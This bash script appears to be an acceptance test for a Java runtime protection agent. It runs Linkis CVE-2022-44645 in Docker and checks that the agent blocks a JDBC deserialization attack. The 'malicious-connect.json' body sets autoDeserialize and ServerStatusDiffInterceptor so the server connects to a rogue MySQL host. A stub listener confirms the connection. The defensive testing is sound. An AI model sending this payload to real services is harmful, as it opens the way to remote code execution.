#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_LINKIS_44645_IMAGE:-vulhub/linkis:1.3.0}"
mysql_image="${OHMYRASP_VULHUB_LINKIS_44645_MYSQL_IMAGE:-mysql:5.7}"
rogue_image="${OHMYRASP_VULHUB_LINKIS_44645_ROGUE_IMAGE:-python:3-alpine}"
network_name="${OHMYRASP_VULHUB_LINKIS_44645_NETWORK:-ohmyrasp-vulhub-linkis44645}"
db_name="${OHMYRASP_VULHUB_LINKIS_44645_DB_NAME:-ohmyrasp-vulhub-linkis44645-db}"
baseline_name="${OHMYRASP_VULHUB_LINKIS_44645_BASELINE_NAME:-ohmyrasp-vulhub-linkis44645-baseline}"
protected_name="${OHMYRASP_VULHUB_LINKIS_44645_PROTECTED_NAME:-ohmyrasp-vulhub-linkis44645-protected}"
rogue_name="${OHMYRASP_VULHUB_LINKIS_44645_ROGUE_NAME:-ohmyrasp-vulhub-linkis44645-rogue}"
baseline_port="${OHMYRASP_VULHUB_LINKIS_44645_BASELINE_PORT:-19310}"
protected_port="${OHMYRASP_VULHUB_LINKIS_44645_PROTECTED_PORT:-19311}"
host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
baseline_dir="logs/vulhub-linkis-1.3.0-44645-java8-baseline"
protected_dir="logs/vulhub-linkis-1.3.0-44645-java8-protected"
payload_dir="logs/vulhub-linkis-1.3.0-44645-java8-payload"
protected_log="${protected_dir}/events.jsonl"
cookie_file="${payload_dir}/linkis.cookies"
login_json="${payload_dir}/login.json"
normal_body="${payload_dir}/normal-connect.json"
malicious_body="${payload_dir}/malicious-connect.json"

copy_logs() {
  local name="$1"
  local dir="$2"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/container.log" 2>&1 || true
  fi
}

cleanup() {
  copy_logs "$baseline_name" "$baseline_dir"
  copy_logs "$protected_name" "$protected_dir"
  docker logs "$rogue_name" > "${payload_dir}/rogue.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" "$rogue_name" "$db_name" >/dev/null 2>&1 || true
  docker network rm "$network_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

write_bodies() {
  cat > "$normal_body" <<'JSON'
{
  "dataSourceName": "normal",
  "dataSourceTypeId": 1,
  "createSystem": "Linkis",
  "connectParams": {
    "host": "127.0.0.1",
    "port": "3308",
    "username": "normal",
    "password": "x",
    "params": "{\"useSSL\":\"false\",\"connectTimeout\":\"2000\"}"
  }
}
JSON
  cat > "$malicious_body" <<'JSON'
{
  "dataSourceName": "evil",
  "dataSourceTypeId": 1,
  "createSystem": "Linkis",
  "connectParams": {
    "host": "rogue",
    "port": "3308",
    "username": "payloadtoken",
    "password": "x",
    "params": "{\"autoDeserialize\":\"true\",\"statementInterceptors\":\"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"useSSL\":\"false\",\"maxAllowedPacket\":\"16777216\"}"
  }
}
JSON
}

verify_image_java8() {
  docker run --rm --entrypoint java "$image" -version > "${payload_dir}/image-java-version.txt" 2>&1
  if ! grep -Fq '1.8.0_' "${payload_dir}/image-java-version.txt"; then
    cat "${payload_dir}/image-java-version.txt" >&2
    echo "Linkis image did not report a Java 8 runtime" >&2
    exit 1
  fi
}

start_db() {
  docker run -d --name "$db_name" \
    --network "$network_name" \
    --network-alias mysql \
    -e MYSQL_ROOT_PASSWORD=root \
    -e MYSQL_DATABASE=linkis \
    "$mysql_image" >/dev/null
}

start_linkis() {
  local name="$1"
  local port="$2"
  shift 2
  docker run -d --name "$name" \
    --network "$network_name" \
    -p "${port}:9001" \
    "$@" \
    "$image" >/dev/null
}

start_rogue() {
  docker rm -f "$rogue_name" >/dev/null 2>&1 || true
  docker run -d --name "$rogue_name" \
    --network "$network_name" \
    --network-alias rogue \
    "$rogue_image" \
    python -c 'import socket,time
s=socket.socket()
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("0.0.0.0",3308))
s.listen(5)
s.settimeout(25)
print("rogue-ready", flush=True)
try:
    c,a=s.accept()
    print("connection-from=%s:%s" % a, flush=True)
    c.close()
except Exception:
    print("no-connection", flush=True)
time.sleep(5)' >/dev/null
  for attempt in $(seq 1 30); do
    if docker logs "$rogue_name" 2>&1 | grep -Fq 'rogue-ready'; then
      return
    fi
    sleep 1
  done
  docker logs "$rogue_name" >&2 || true
  echo "rogue MySQL listener did not become ready" >&2
  exit 1
}

wait_for_login() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local status
  for attempt in $(seq 1 180); do
    rm -f "$cookie_file" "$login_json"
    status="$(
      curl -sS --max-time 20 \
        -c "$cookie_file" \
        -H 'Content-Type: application/json' \
        -d '{"userName":"hadoop","password":"hadoop"}' \
        -o "$login_json" \
        -w '%{http_code}' \
        "http://127.0.0.1:${port}/api/rest_j/v1/user/login" 2>"${dir}/login-${attempt}.err" || true
    )"
    printf 'login_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
    if [[ "$status" == "200" ]] && grep -Fq 'login successful' "$login_json"; then
      return
    fi
    if ! docker ps --filter "name=${name}" --filter status=running --format '{{.Names}}' \
      | grep -Fq "$name"; then
      docker logs "$name" >&2 || true
      echo "Linkis container ${name} stopped before login readiness" >&2
      exit 1
    fi
    sleep 2
  done
  docker logs "$name" >&2 || true
  cat "$login_json" >&2 || true
  echo "Linkis login did not become ready on ${port}" >&2
  exit 1
}

connect_datasource() {
  local port="$1"
  local body="$2"
  local output="$3"
  curl -sS --max-time 60 \
    -b "$cookie_file" \
    -H 'Content-Type: application/json;charset=UTF-8' \
    --data-binary "@${body}" \
    -o "$output" \
    -w '%{http_code}' \
    "http://127.0.0.1:${port}/api/rest_j/v1/data-source-manager/op/connect/json" || true
}

wait_for_publicservice() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local status
  for attempt in $(seq 1 160); do
    wait_for_login "$name" "$port" "$dir"
    status="$(connect_datasource "$port" "$normal_body" "${dir}/normal-connect-${attempt}.json")"
    printf 'publicservice_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
    if [[ "$status" == "200" ]] \
      && ! grep -Fq 'NoApplicationExistsException' "${dir}/normal-connect-${attempt}.json"; then
      return
    fi
    sleep 3
  done
  docker logs "$name" >&2 || true
  echo "Linkis publicservice did not register on ${port}" >&2
  exit 1
}

wait_for_rogue_connection() {
  local dir="$1"
  for attempt in $(seq 1 35); do
    docker logs "$rogue_name" > "${dir}/rogue-${attempt}.log" 2>&1 || true
    if grep -Fq 'connection-from=' "${dir}/rogue-${attempt}.log"; then
      return
    fi
    sleep 1
  done
  docker logs "$rogue_name" >&2 || true
  echo "baseline Linkis did not connect to rogue MySQL" >&2
  exit 1
}

wait_for_rogue_no_connection() {
  local dir="$1"
  for attempt in $(seq 1 35); do
    docker logs "$rogue_name" > "${dir}/rogue-${attempt}.log" 2>&1 || true
    if grep -Fq 'connection-from=' "${dir}/rogue-${attempt}.log"; then
      docker logs "$rogue_name" >&2 || true
      echo "protected Linkis still connected to rogue MySQL" >&2
      exit 1
    fi
    if grep -Fq 'no-connection' "${dir}/rogue-${attempt}.log"; then
      return
    fi
    sleep 1
  done
  docker logs "$rogue_name" >&2 || true
  echo "rogue MySQL listener did not report no-connection" >&2
  exit 1
}

detection_count() {
  grep -Ec '"event":"ohmyrasp-detection"' "$protected_log" 2>/dev/null || true
}

jdbc_block_count() {
  grep -Ec '"algorithm":"java8_jdbc_mysql_deserialization".*"action":"block"' \
    "$protected_log" 2>/dev/null || true
}

assert_no_detection() {
  if [[ "$(detection_count)" != "0" ]]; then
    cat "$protected_log" >&2
    echo "protected Linkis produced a detection before malicious JDBC traffic" >&2
    exit 1
  fi
}

run_baseline() {
  start_linkis "$baseline_name" "$baseline_port"
  wait_for_publicservice "$baseline_name" "$baseline_port" "$baseline_dir"
  start_rogue
  local status
  status="$(connect_datasource "$baseline_port" "$malicious_body" "${baseline_dir}/malicious-connect.json")"
  printf 'malicious_status=%s\n' "$status" >> "${baseline_dir}/attempts.log"
  if [[ "$status" != "200" ]] || ! grep -Fq 'Connection Failed' "${baseline_dir}/malicious-connect.json"; then
    cat "${baseline_dir}/malicious-connect.json" >&2 || true
    echo "baseline Linkis malicious datasource request did not reach connection flow" >&2
    exit 1
  fi
  wait_for_rogue_connection "$baseline_dir"
  copy_logs "$baseline_name" "$baseline_dir"
  docker rm -f "$baseline_name" "$rogue_name" >/dev/null 2>&1 || true
}

run_protected() {
  start_linkis "$protected_name" "$protected_port" \
    -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
    -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
    -e JAVA_TOOL_OPTIONS="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true"

  for attempt in $(seq 1 120); do
    if grep -Fq '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
      printf 'agent_start_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
      break
    fi
    sleep 1
  done
  if ! grep -Fq '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
    cat "$protected_log" >&2 || true
    echo "missing Java8 agent startup event for Linkis" >&2
    exit 1
  fi

  wait_for_publicservice "$protected_name" "$protected_port" "$protected_dir"
  assert_no_detection

  start_rogue
  local previous_blocks
  local current_blocks
  local status
  previous_blocks="$(jdbc_block_count)"
  status="$(connect_datasource "$protected_port" "$malicious_body" "${protected_dir}/malicious-connect.json")"
  printf 'malicious_status=%s\n' "$status" >> "${protected_dir}/attempts.log"
  for attempt in $(seq 1 30); do
    current_blocks="$(jdbc_block_count)"
    if (( current_blocks > previous_blocks )); then
      wait_for_rogue_no_connection "$protected_dir"
      copy_logs "$protected_name" "$protected_dir"
      docker rm -f "$protected_name" "$rogue_name" >/dev/null 2>&1 || true
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  cat "${protected_dir}/malicious-connect.json" >&2 || true
  echo "missing java8_jdbc_mysql_deserialization block event for Linkis CVE-2022-44645" >&2
  exit 1
}

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

rm -rf "$baseline_dir" "$protected_dir" "$payload_dir"
mkdir -p "$baseline_dir" "$protected_dir" "$payload_dir"
: > "$protected_log"
chmod 666 "$protected_log"
write_bodies
verify_image_java8

docker rm -f "$baseline_name" "$protected_name" "$rogue_name" "$db_name" >/dev/null 2>&1 || true
docker network rm "$network_name" >/dev/null 2>&1 || true
docker network create "$network_name" >/dev/null
start_db

run_baseline
run_protected

echo "Vulhub Linkis CVE-2022-44645 Java8 acceptance passed"
